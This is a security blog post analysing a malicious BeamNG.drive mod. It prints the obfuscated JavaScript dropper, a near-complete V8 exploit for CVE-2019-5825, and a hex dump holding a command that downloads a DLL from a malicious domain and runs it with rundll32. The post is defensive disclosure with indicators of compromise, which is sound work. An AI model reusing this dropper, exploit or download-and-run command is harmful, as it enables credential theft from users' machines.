<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://lemonyte.com/blog/beamng-malware">Original</a>
    <h1>I Found Malware in a BeamNG Mod</h1>
    
    <div id="readability-page-1" class="page"><div><!----><p><img src="https://lemonyte.com/assets/beamng-american-road.png" alt="Banner"/></p> <blockquote><p><strong>WARNING</strong>: This post contains snippets of code from real malware.
Do not run any of the code in this post outside of a secure, isolated virtual machine.</p></blockquote> <p>Last week, I fired up <a href="https://www.beamng.com/game/" rel="nofollow">BeamNG.drive</a> hoping to enjoy a ride around Belasco City.
But, just after I launched the game, I noticed an odd notification from my antivirus software.</p> <p><img src="https://lemonyte.com/assets/beamng-av-alert.png" alt="AV alert"/></p> <p><code>curl.exe</code>? That can’t be good.
Cloudflare Radar <a href="https://radar.cloudflare.com/scan/a5c7ceb7-ec86-456f-adfc-dbfa1e8c41ba/summary" rel="nofollow">confirmed</a> the domain <code>curl</code> tried to access is known to be malicious.
At this point, however, I wasn’t 100% sure this came from the game.</p> <h2>Starting the investigation</h2> <p>To find out if the problem was indeed in the game, I re-launched it with <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" rel="nofollow">Process Monitor</a> running.
Filtering through the events, my suspicion was confirmed: a process launching <code>cmd</code> with a <code>curl</code> command was spawned by the game.</p> <p><img src="https://lemonyte.com/assets/beamng-procmon.png" alt="Process monitor screenshot"/></p> <p>But where exactly was this command coming from? Was it a mod, or was the game itself compromised?</p> <p>Inspecting the call stack in Process Monitor shows the command was executed by calling <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec" rel="nofollow"><code>WinExec</code></a>, a legacy function from 16-bit Windows that is commonly used in shellcode malware.</p> <p><img src="https://lemonyte.com/assets/beamng-procmon-stack.png" alt="Stack screenshot"/></p> <p>To take a closer look, I attached the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/" rel="nofollow">WinDbg</a> debugger to the game process and set a breakpoint on <code>WinExec</code>.
When the malicious code tries to run the command, the debugger will pause the process and allow me to inspect the call stack and memory.
That breakpoint was hit at the exact moment I opened the in-game mod manager.</p> <p>WinDbg shows which memory address <code>WinExec</code> was called at, and we can use that to find the shellcode that executed the command.</p> <p><img src="https://lemonyte.com/assets/beamng-windbg.png" alt="WinDbg screenshot"/></p> <p>But how did this shellcode even get there in the first place?
Unfortunately, the call stack doesn’t show us which file it came from, but it does contain another clue: <code>libcef</code>.
This refers to the <a href="https://bitbucket.org/chromiumembedded/cef" rel="nofollow">Chromium Embedded Framework</a>, which suggests a vulnerability in Chromium might have been exploited to insert the shellcode into memory.
BeamNG.drive uses Chromium to render parts of the UI, including the mod manager where the malicious code was executed.</p> <p>I disabled all my downloaded mods and dug deeper.</p> <h2>The mod</h2> <p>I had a few more clues to help narrow down my search:</p> <ol><li>When I previously played the game 2 months ago, there was nothing suspicious.</li> <li>The malicious command was spawned when I opened the in-game mod manager.</li> <li>Disabling all mods stopped the suspicious event from appearing.</li></ol> <p>Using this info, I focused on the mods I had installed or updated in the last 2 months.
After unpacking the mod <code>.zip</code> files and searching through dozens upon dozens of Lua files, I found… nothing.
Looking through that many files was just too slow. I needed to find out exactly which mod was causing the problem.</p> <p>With any luck, the moment I enabled the problematic mod, the suspicious event would reappear, so I started to enable them one by one.
And sure enough, it came back when I turned on a mod called <em>American Road</em>.</p> <h2>The dropper</h2> <p>Now that I knew which mod was the culprit, finding the malicious code should be much easier.</p> <h3>First stage</h3> <p>It didn’t take long to find some suspicious JavaScript code in a file named <code>american_road_patreon_banner.js</code>.</p> <pre><!----><code>
<span>const</span> baseFolder <span>=</span> <span>&#34;/ui/modModules/american_road_patreon_banner&#34;</span>
<span>var</span> xhr <span>=</span> <span>new</span> <span>XMLHttpRequest</span><span>(</span><span>)</span><span>;</span>
xhr<span>.</span><span>open</span><span>(</span><span>&#39;GET&#39;</span><span>,</span> baseFolder <span>+</span> <span>&#34;/banner.c_css&#34;</span><span>,</span> <span>true</span><span>)</span><span>;</span>
xhr<span>.</span>responseType <span>=</span> <span>&#34;arraybuffer&#34;</span><span>;</span> 
xhr<span>.</span><span>onload</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>if</span> <span>(</span>xhr<span>.</span>status <span>===</span> <span>200</span><span>)</span> <span>{</span>
    <span>var</span> compiledcss <span>=</span> <span>new</span> <span>TextDecoder</span><span>(</span><span>)</span><span>.</span><span>decode</span><span>(</span>xhr<span>.</span>response<span>)</span><span>;</span>
    <span>var</span> styles <span>=</span> <span>(</span><span>(</span><span>s<span>,</span> k</span><span>)</span> <span>=&gt;</span> <span>[</span><span>...</span>s<span>]</span>
    <span>.</span><span>map</span><span>(</span><span>(</span><span>c<span>,</span> i</span><span>)</span> <span>=&gt;</span> String<span>.</span><span>fromCharCode</span><span>(</span>c<span>.</span><span>charCodeAt</span><span>(</span><span>0</span><span>)</span> <span>^</span> k<span>.</span><span>charCodeAt</span><span>(</span>i <span>%</span> k<span>.</span>length<span>)</span><span>)</span><span>)</span>
    <span>.</span><span>join</span><span>(</span><span>&#39;&#39;</span><span>)</span><span>)</span><span>(</span>compiledcss<span>,</span> <span>&#34;css&#34;</span><span>)</span><span>;</span>
    <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>var</span> bannerImage <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>&#34;img&#34;</span><span>,</span> <span>[</span><span>]</span><span>.</span>constructor<span>.</span><span>constructor</span><span>(</span>styles<span>)</span><span>(</span><span>)</span><span>)</span><span>;</span>
      bannerImage<span>.</span>id <span>=</span> <span>&#34;patreon-banner&#34;</span>
      bannerImage<span>.</span>src <span>=</span> baseFolder <span>+</span> <span>&#34;/banner.gif&#34;</span><span>;</span>
      bannerImage<span>.</span>style <span>=</span> <span>&#34;display:none; padding-top: 2.6rem;&#34;</span><span>;</span>
      document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>bannerImage<span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>500</span><span>)</span>      
  <span>}</span>
<span>}</span><span>;</span>
xhr<span>.</span><span>send</span><span>(</span><span>)</span><span>;</span>



<span>export</span> <span>default</span> angular<span>.</span><span>module</span><span>(</span><span>&#39;american_road_patreon_banner&#39;</span><span>,</span> <span>[</span><span>&#39;ui.router&#39;</span><span>]</span><span>)</span>
<span>.</span><span>config</span><span>(</span><span>[</span><span>&#39;$stateProvider&#39;</span><span>,</span> <span>function</span><span>(</span><span>$stateProvider</span><span>)</span> <span>{</span>
  $stateProvider<span>.</span><span>state</span><span>(</span><span>&#39;menu.american_road_patreon_banner&#39;</span><span>,</span> <span>{</span>
    <span>url</span><span>:</span> <span>&#39;/american_road_patreon_banner&#39;</span><span>,</span>
    <span>templateUrl</span><span>:</span> <span>&#39;/ui/modModules/american_road_patreon_banner/american_road_patreon_banner.html&#39;</span><span>,</span>
    <span>controller</span><span>:</span> <span>&#39;AMPatreonBannerController&#39;</span><span>,</span>
  <span>}</span><span>)</span>
<span>}</span><span>]</span><span>)</span>
</code><!----></pre> <p>At first glance, this looks like a harmless script that shows a Patreon banner when the player uses the <em>American Road</em> map.
But on closer inspection, there are a few things that look off:</p> <ul><li><p>The <code>american_road_patreon_banner.html</code> file that’s referenced in the script does not actually exist.</p></li> <li><p>It attempts to load a “compiled CSS” file called <code>banner.c_css</code> using an <code>XMLHttpRequest</code>, which seems unnecessarily complex.</p> <pre><!----><code><span>var</span> xhr <span>=</span> <span>new</span> <span>XMLHttpRequest</span><span>(</span><span>)</span><span>;</span>
xhr<span>.</span><span>open</span><span>(</span><span>&#39;GET&#39;</span><span>,</span> baseFolder <span>+</span> <span>&#34;/banner.c_css&#34;</span><span>,</span> <span>true</span><span>)</span><span>;</span>
xhr<span>.</span>responseType <span>=</span> <span>&#34;arraybuffer&#34;</span><span>;</span> </code><!----></pre></li> <li><p>After loading the “compiled CSS”, the script decodes it using bitwise XOR with the string <code>css</code>.</p> <pre><!----><code><span>var</span> compiledcss <span>=</span> <span>new</span> <span>TextDecoder</span><span>(</span><span>)</span><span>.</span><span>decode</span><span>(</span>xhr<span>.</span>response<span>)</span><span>;</span>
<span>var</span> styles <span>=</span> <span>(</span><span>(</span><span>s<span>,</span> k</span><span>)</span> <span>=&gt;</span> <span>[</span><span>...</span>s<span>]</span>
<span>.</span><span>map</span><span>(</span><span>(</span><span>c<span>,</span> i</span><span>)</span> <span>=&gt;</span> String<span>.</span><span>fromCharCode</span><span>(</span>c<span>.</span><span>charCodeAt</span><span>(</span><span>0</span><span>)</span> <span>^</span> k<span>.</span><span>charCodeAt</span><span>(</span>i <span>%</span> k<span>.</span>length<span>)</span><span>)</span><span>)</span>
<span>.</span><span>join</span><span>(</span><span>&#39;&#39;</span><span>)</span><span>)</span><span>(</span>compiledcss<span>,</span> <span>&#34;css&#34;</span><span>)</span><span>;</span></code><!----></pre></li></ul> <p>The most suspicious part is <code>[].constructor.constructor(styles)()</code>.
Let’s break this expression down into its components:</p> <ul><li><code>[]</code> is an empty array literal.</li> <li><code>[].constructor</code> is the constructor of the array type, which is a function.</li> <li>Functions in JavaScript are objects too, of the <code>Function</code> type, so <code>[].constructor.constructor</code> is the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function#constructor" rel="nofollow">constructor of the <code>Function</code> type</a>.</li> <li><code>(styles)</code> calls the <code>Function</code> constructor creating a new function from the string <code>styles</code>.</li> <li><code>()</code> calls the newly created function.</li></ul> <p>A deobfuscated version of this would look like <code>Function(styles)()</code>, which is essentially the same as <code>eval(styles)</code>, but disguised to seem like legitimate code.</p> <p>Another interesting file is a Lua script that reloads the user interface after the mod is loaded, which the author of the dropper was kind enough to document for us.</p> <pre><!----><code>


<span>reloadUI</span><span>(</span><span>)</span></code><!----></pre> <p>Obviously, there was quite a bit of effort put into testing this dropper and ensuring it executes the JavaScript code.
They even went as far as finding the correct Patreon link of the original mod author for the GIF banner image.</p> <p>We’ve now established that this code is dynamically executing some hidden JavaScript, but what exactly is it executing?</p> <h3>Second stage</h3> <p>Remember that “compiled CSS” file? The first 3 lines look like this:</p> <pre><!----><code>␏␖ C␐␜
␅␖␑ ␚␌␝,␁␆␕␅␖␁^␝␖␔S2␑␁␒␚1␆␅␕␖␑[KJ_␕␏␜␒␗,␅
␖␄^␝␖␔S5␏␜␒␗EG&#34;␁␁␂</code><!----></pre> <p>Clearly, the data is not in plain text, so we need to decode it.
I used this snippet from the original JavaScript, replacing the <code>eval</code>-like part with <code>console.log</code> to see the decoded data.
I also replaced the <code>XMLHttpRequest</code> with <code>fs.readFileSync</code> and then ran it with Node.js inside a virtual machine.</p> <pre><!----><code><span>import</span> fs <span>from</span> <span>&#39;node:fs&#39;</span><span>;</span>

<span>try</span> <span>{</span>
  <span>const</span> data <span>=</span> fs<span>.</span><span>readFileSync</span><span>(</span><span>&#39;banner.c_css&#39;</span><span>)</span><span>;</span>

  <span>var</span> compiledcss <span>=</span> <span>new</span> <span>TextDecoder</span><span>(</span><span>)</span><span>.</span><span>decode</span><span>(</span>data<span>)</span><span>;</span>
  <span>var</span> styles <span>=</span> <span>(</span><span>(</span><span>s<span>,</span> k</span><span>)</span> <span>=&gt;</span> <span>[</span><span>...</span>s<span>]</span>
  <span>.</span><span>map</span><span>(</span><span>(</span><span>c<span>,</span> i</span><span>)</span> <span>=&gt;</span> String<span>.</span><span>fromCharCode</span><span>(</span>c<span>.</span><span>charCodeAt</span><span>(</span><span>0</span><span>)</span> <span>^</span> k<span>.</span><span>charCodeAt</span><span>(</span>i <span>%</span> k<span>.</span>length<span>)</span><span>)</span><span>)</span>
  <span>.</span><span>join</span><span>(</span><span>&#39;&#39;</span><span>)</span><span>)</span><span>(</span>compiledcss<span>,</span> <span>&#34;css&#34;</span><span>)</span><span>;</span>

  console<span>.</span><span>log</span><span>(</span>styles<span>)</span><span>;</span>
<span>}</span> <span>catch</span> <span>(</span>err<span>)</span> <span>{</span>
  console<span>.</span><span>error</span><span>(</span>err<span>)</span><span>;</span>
<span>}</span></code><!----></pre> <p>This gives us the second stage of the dropper:</p> <blockquote><p><strong>WARNING</strong>: THIS IS DANGEROUS CODE.
Even though I’ve omitted the bad part of the payload, do not run this unless you know what you’re doing.</p></blockquote> <pre><!----><code>
<span>function</span> <span>gfxbuffer</span><span>(</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> r <span>=</span> <span>0</span><span>;</span> r <span>&lt;</span> <span>10</span> <span>**</span> <span>5</span><span>;</span> r<span>++</span><span>)</span> <span>test</span><span>(</span>array<span>)</span><span>;</span>
    <span>(</span>array<span>.</span>length <span>=</span> <span>33554431</span><span>)</span><span>,</span>
        array<span>.</span><span>fill</span><span>(</span><span>1</span><span>,</span> <span>23</span><span>,</span> <span>24</span><span>)</span><span>,</span>
        array<span>.</span><span>fill</span><span>(</span><span>1</span><span>,</span> <span>25</span><span>)</span><span>,</span>
        array<span>.</span><span>push</span><span>(</span><span>2</span><span>)</span><span>,</span>
        <span>(</span>array<span>.</span>length <span>+=</span> <span>500</span><span>)</span><span>,</span>
        <span>(</span>cnt <span>=</span> <span>1</span><span>)</span><span>;</span>
    <span>try</span> <span>{</span>
        <span>test</span><span>(</span>array<span>)</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span>r<span>)</span> <span>{</span>
        <span>return</span> <span>test_array</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
    <span>return</span> False<span>;</span>
<span>}</span>

<span>function</span> <span>rq</span><span>(</span><span>r</span><span>)</span> <span>{</span>
    <span>let</span> t <span>=</span> farray<span>[</span><span>25</span><span>]</span><span>;</span>
    farray<span>[</span><span>25</span><span>]</span> <span>=</span> <span>(</span>r <span>-</span> <span>0x1fn</span><span>)</span><span>.</span><span>i2f</span><span>(</span><span>)</span><span>;</span>
    <span>let</span> n <span>=</span> tarray<span>[</span><span>0</span><span>]</span><span>;</span>
    <span>return</span> <span>(</span>farray<span>[</span><span>25</span><span>]</span> <span>=</span> t<span>)</span><span>,</span> n<span>;</span>
<span>}</span>
<span>function</span> <span>wq</span><span>(</span><span>r<span>,</span> t</span><span>)</span> <span>{</span>
    <span>let</span> n <span>=</span> farray<span>[</span><span>25</span><span>]</span><span>;</span>
    <span>(</span>farray<span>[</span><span>25</span><span>]</span> <span>=</span> <span>(</span>r <span>-</span> <span>0x1fn</span><span>)</span><span>.</span><span>i2f</span><span>(</span><span>)</span><span>)</span><span>,</span> <span>(</span>tarray<span>[</span><span>0</span><span>]</span> <span>=</span> t<span>)</span><span>,</span> <span>(</span>farray<span>[</span><span>25</span><span>]</span> <span>=</span> n<span>)</span><span>;</span>
<span>}</span>
<span>function</span> <span>addrof</span><span>(</span><span>r</span><span>)</span> <span>{</span>
    <span>return</span> <span>(</span>obj<span>.</span>b <span>=</span> r<span>)</span><span>,</span> farray<span>[</span><span>33</span><span>]</span><span>.</span><span>f2i</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
<span>function</span> <span>cpy</span><span>(</span><span>r<span>,</span> t</span><span>)</span> <span>{</span>
    t<span>.</span><span>forEach</span><span>(</span><span>(</span><span>t<span>,</span> n</span><span>)</span> <span>=&gt;</span> <span>{</span>
        <span>wq</span><span>(</span>r <span>+</span> <span>BigInt</span><span>(</span>n<span>)</span><span>,</span> <span>BigInt</span><span>(</span>t<span>)</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
<span>}</span>
<span>function</span> <span>parse_css</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> r <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span>
            <span>0</span><span>,</span> <span>97</span><span>,</span> <span>115</span><span>,</span> <span>109</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>133</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>96</span><span>,</span>
            <span>0</span><span>,</span> <span>1</span><span>,</span> <span>127</span><span>,</span> <span>3</span><span>,</span> <span>130</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>6</span><span>,</span> <span>129</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span>
            <span>128</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>7</span><span>,</span> <span>133</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>97</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>10</span><span>,</span> <span>138</span><span>,</span>
            <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>132</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>65</span><span>,</span> <span>0</span><span>,</span> <span>11</span><span>,</span>
        <span>]</span><span>)</span><span>,</span>
        t <span>=</span> <span>new</span> <span>WebAssembly<span>.</span>Instance</span><span>(</span><span>new</span> <span>WebAssembly<span>.</span>Module</span><span>(</span>r<span>)</span><span>)</span><span>.</span>exports<span>.</span>a<span>;</span>
    <span>gfxbuffer</span><span>(</span><span>)</span><span>;</span>
    <span>let</span> n <span>=</span> <span>rq</span><span>(</span><span>addrof</span><span>(</span>t<span>)</span> <span>-</span> <span>1n</span> <span>+</span> <span>24n</span><span>)</span> <span>-</span> <span>1n</span><span>,</span>
        e <span>=</span> <span>rq</span><span>(</span>n <span>+</span> <span>8n</span><span>)</span> <span>-</span> <span>1n</span><span>,</span>
        a <span>=</span> <span>rq</span><span>(</span>e <span>+</span> <span>16n</span><span>)</span> <span>-</span> <span>1n</span><span>;</span>
    <span>cpy</span><span>(</span>
        <span>rq</span><span>(</span>a <span>+</span> <span>0xe8n</span><span>)</span> <span>+</span> <span>0n</span><span>,</span>
        <span>[</span>
            <span>72</span><span>,</span> <span>131</span><span>,</span> <span>236</span><span>,</span> 
        <span>]</span><span>,</span>
    <span>)</span><span>,</span>
        <span>setTimeout</span><span>(</span>t<span>,</span> <span>1e3</span><span>)</span><span>;</span>
<span>}</span>
<span>parse_css</span><span>(</span><span>)</span><span>;</span></code><!----></pre> <p>There’s a lot going on here, but in essence this code exploits <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-5825" rel="nofollow">CVE-2019-5825</a>, a 6-year-old vulnerability in Chromium’s V8 JavaScript engine, to write machine code to an out-of-bounds executable memory location.
The code above is an almost identical copy of <a href="https://github.com/exodusintel/Chromium-941743/blob/master/exp.js" rel="nofollow">this proof-of-concept</a> on GitHub.</p> <ul><li><p>We start with a WebAssembly module that is defined and instantiated in the JavaScript.</p> <pre><!----><code><span>const</span> r <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span>
          <span>0</span><span>,</span> <span>97</span><span>,</span> <span>115</span><span>,</span> <span>109</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>133</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>96</span><span>,</span>
          <span>0</span><span>,</span> <span>1</span><span>,</span> <span>127</span><span>,</span> <span>3</span><span>,</span> <span>130</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>0</span><span>,</span> <span>6</span><span>,</span> <span>129</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span>
          <span>128</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>7</span><span>,</span> <span>133</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>97</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>10</span><span>,</span> <span>138</span><span>,</span>
          <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>132</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>128</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>65</span><span>,</span> <span>0</span><span>,</span> <span>11</span><span>,</span>
      <span>]</span><span>)</span><span>,</span>
      t <span>=</span> <span>new</span> <span>WebAssembly<span>.</span>Instance</span><span>(</span><span>new</span> <span>WebAssembly<span>.</span>Module</span><span>(</span>r<span>)</span><span>)</span><span>.</span>exports<span>.</span>a<span>;</span></code><!----></pre> <p>The contents of this module are not really important, as long as it exports a function.
In this case, it’s a function called <code>a</code> that returns <code>0</code>.</p> <pre><!----><code><span>(</span><span>module</span>
  <span>(</span><span>type</span>  <span>(</span><span>func</span> <span>(</span><span>result</span> <span>i32</span><span>)</span><span>)</span><span>)</span>
  <span>(</span><span>func</span>  <span>(</span><span>type</span> <span>0</span><span>)</span> <span>(</span><span>result</span> <span>i32</span><span>)</span>
    <span>i32<span>.</span>const</span> <span>0</span>
  <span>)</span>
  <span>(</span><span>export</span> <span>&#34;a&#34;</span> <span>(</span><span>func</span> <span>0</span><span>)</span><span>)</span>
<span>)</span></code><!----></pre></li> <li><p>The <code>gfxbuffer</code> function sets the stage for out-of-bounds memory reading and writing.</p></li> <li><p>The memory address of the WASM <code>a</code> function is determined.</p> <pre><!----><code><span>let</span> n <span>=</span> <span>rq</span><span>(</span><span>addrof</span><span>(</span>t<span>)</span> <span>-</span> <span>1n</span> <span>+</span> <span>24n</span><span>)</span> <span>-</span> <span>1n</span><span>,</span>
    e <span>=</span> <span>rq</span><span>(</span>n <span>+</span> <span>8n</span><span>)</span> <span>-</span> <span>1n</span><span>,</span>
    a <span>=</span> <span>rq</span><span>(</span>e <span>+</span> <span>16n</span><span>)</span> <span>-</span> <span>1n</span><span>;</span></code><!----></pre></li> <li><p>A shellcode is copied into where the <code>a</code> function is located in memory.</p> <pre><!----><code><span>cpy</span><span>(</span>
    <span>rq</span><span>(</span>a <span>+</span> <span>0xe8n</span><span>)</span> <span>+</span> <span>0n</span><span>,</span>
    <span>[</span>
        <span>72</span><span>,</span> <span>131</span><span>,</span> <span>236</span><span>,</span> 
    <span>]</span><span>,</span>
<span>)</span><span>,</span></code><!----></pre></li> <li><p>Finally, the now-modified <code>a</code> function is scheduled to run after a 1-second delay.</p> <pre><!----><code><span>setTimeout</span><span>(</span>t<span>,</span> <span>1e3</span><span>)</span><span>;</span></code><!----></pre></li> <li><p>To make this work, a few primitives are defined:</p> <ul><li><code>addrof</code>: gets the address of an object in memory.</li> <li><code>rq</code>: likely stands for “read quadword”, and reads a 64-bit value from a memory address.</li> <li><code>wq</code>: similarly, probably “write quadword”, and writes a 64-bit value to memory at a specified address.</li> <li><code>cpy</code>: copies an array of values to a specified memory location.</li></ul></li></ul> <h3>Third stage: the shellcode</h3> <p>The data that is copied into executable memory is the shellcode payload we’re looking for.
Going deeper down this rabbit hole, we can write the bytes to a file to get a better look at it.</p> <pre><!----><code><span>import</span> fs <span>from</span> <span>&#39;node:fs&#39;</span><span>;</span>

<span>const</span> r <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span>
    <span>72</span><span>,</span> <span>131</span><span>,</span> <span>236</span><span>,</span> 
<span>]</span><span>)</span><span>;</span>

fs<span>.</span><span>writeFileSync</span><span>(</span><span>&#34;shellcode.bin&#34;</span><span>,</span> r<span>)</span><span>;</span></code><!----></pre> <p>Viewing the resulting file in a hex or text editor reveals the original <code>curl</code> command we saw in Process Monitor and WinDbg:</p> <pre><!----><code>Offset  Bytes                                            Ascii
        00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
------  -----------------------------------------------  -----
000030  C8 41 8B 41 18 85 C0 74 58 45 8B 51 20 48 89 5C  ÈA�A��ÀtXE�Q H�\
000040  24 20 48 BB 57 69 6E 45 78 65 63 00 0F 1F 40 00  $ H»WinExec ��@
...
0000A0  33 C0 48 83 C4 28 C3 63 6D 64 20 2F 63 20 63 75  3ÀH�Ä(Ãcmd /c cu
0000B0  72 6C 20 2D 73 20 2D 2D 66 61 69 6C 20 68 74 74  rl -s --fail htt
0000C0  70 73 3A 2F 2F 61 63 37 62 32 65 64 61 36 66 31  ps://ac7b2eda6f1
0000D0  34 2E 64 61 74 61 68 6F 67 2E 73 75 2F 32 77 33  4.datahog.su/2w3
0000E0  65 39 38 74 35 7A 68 32 39 38 77 33 74 7A 68 67  e98t5zh298w3tzhg
0000F0  37 39 38 32 77 33 74 34 65 67 20 2D 6F 20 22 25  7982w3t4eg -o &#34;%
000100  54 45 4D 50 25 5C 74 6D 70 36 46 43 31 35 2E 74  TEMP%\tmp6FC15.t
000110  6D 70 22 20 26 26 20 6D 6F 76 65 20 22 25 54 45  mp&#34; &amp;&amp; move &#34;%TE
000120  4D 50 25 5C 74 6D 70 36 46 43 31 35 2E 74 6D 70  MP%\tmp6FC15.tmp
000130  22 20 22 25 54 45 4D 50 25 5C 74 6D 70 36 46 43  &#34; &#34;%TEMP%\tmp6FC
000140  31 35 2E 64 6C 6C 22 20 26 26 20 72 75 6E 64 6C  15.dll&#34; &amp;&amp; rundl
000150  6C 33 32 20 22 25 54 45 4D 50 25 5C 74 6D 70 36  l32 &#34;%TEMP%\tmp6
000160  46 43 31 35 2E 64 6C 6C 22 2C 6D 61 69 6E 00     FC15.dll&#34;,main</code><!----></pre> <p>The bytes before the command are probably x86 instructions that locate and call the <code>WinExec</code> function, which is responsible for executing the command.</p> <h2>The payload</h2> <p>All the code we’ve seen so far is just to download and execute a DLL file from the Internet.
This DLL is the real malware and a quick <a href="https://tria.ge/250420-gjl4rsxnx5/behavioral1" rel="nofollow">analysis</a> reveals it’s an infostealer that steals passwords from browsers and the Exodus crypto wallet app.</p> <h2>Indicators of compromise</h2> <p>File paths:</p> <ul><li><a href="https://www.virustotal.com/gui/file/9ec86514d5993782d455a4c9717ec4f06d0dfcd556e8de6cf0f8346b8b8629d4/detection" rel="nofollow"><code>%TEMP%\tmp6FC15.tmp</code></a></li> <li><code>%TEMP%\tmp6FC15.dll</code></li> <li><a href="https://www.virustotal.com/gui/file/75c0aa897075a7bfa64d8a55be636a6984e2d1a5a05a54f0f01b0eb4653e9c7a/detection" rel="nofollow"><code>%TEMP%\TMP785E.tmp</code></a></li></ul> <p>Hashes:</p> <ul><li><p>MD5: <code>fb2799e1d76a5897bcc2675e90f22869</code></p></li> <li><p>SHA-1: <code>96708c84e07d058b5f0012666e565617907add99</code></p></li> <li><p>SHA-256: <code>9ec86514d5993782d455a4c9717ec4f06d0dfcd556e8de6cf0f8346b8b8629d4</code></p></li> <li><p>MD5: <code>3134c94ffbc5ee53f76e12d88e8d964d</code></p></li> <li><p>SHA-1: <code>a77271854d70ac119552ab830eb266e94cc8b9cc</code></p></li> <li><p>SHA-256: <code>75c0aa897075a7bfa64d8a55be636a6984e2d1a5a05a54f0f01b0eb4653e9c7a</code></p></li></ul> <p>Domains:</p> <ul><li><a href="https://radar.cloudflare.com/scan/a5c7ceb7-ec86-456f-adfc-dbfa1e8c41ba/summary" rel="nofollow"><code>ac7b2eda6f14.datahog.su</code></a></li> <li><code>datacrab-analytics.com</code></li></ul> <h2>So, what now?</h2> <p>After determining which mod is infected, I reached out to the BeamNG team with details about the mod and the malicious code.
Within a few days, the infected mod version was removed from the official repository, and its author’s account was suspended because it is very likely compromised.</p> <p>If you have <em>American Road</em> installed, you should <strong>remove it</strong> and scan your computer for malware.
I also recommend <strong>changing all your passwords</strong>, as it’s possible they might have been stolen if your antivirus didn’t stop the DLL from executing.</p> <p>Looking through the <a href="https://www.beamng.com/resources/american-road.3100/" rel="nofollow">mod’s page</a> on the BeamNG website, I found the malicious code was added on April 1st.
The changelog stating “added patreon banner” was the final nail in the coffin.
Unfortunately, over 3500 people had already downloaded the compromised version of the mod before it was removed, so it’s possible that some had their passwords or personal information stolen.
VirusTotal <a href="https://www.virustotal.com/gui/file/9ec86514d5993782d455a4c9717ec4f06d0dfcd556e8de6cf0f8346b8b8629d4/detection" rel="nofollow">reports</a> that most antivirus programs detect the DLL as malicious, including Microsoft Windows Defender, but there is about a one-week gap between the April 1st update and the first analysis.</p> <p>To prevent incidents like this from happening in the future, the solution could be as simple as updating the Chromium Embedded Framework dependency to a newer version.
WinDbg shows that the game is using version <code>3.3626.1895.g7001d56</code> which was released in March 2019 (yes, that’s 6 years old already!), and there were quite a few Chromium out-of-bounds access vulnerabilities fixed in the last few years.</p> <p>BeamNG.drive also uses the <code>--no-sandbox</code> flag, which likely allowed the exploit to work in the first place, so removing it would be a good idea as well.</p> <p>Perhaps I’ll make a follow-up post reverse-engineering the shellcode and analyzing the DLL in more detail, so stay tuned!</p> <h2>Summary</h2> <p>In this post, we looked at an infected mod for BeamNG.drive that included obfuscated JavaScript and shellcode.
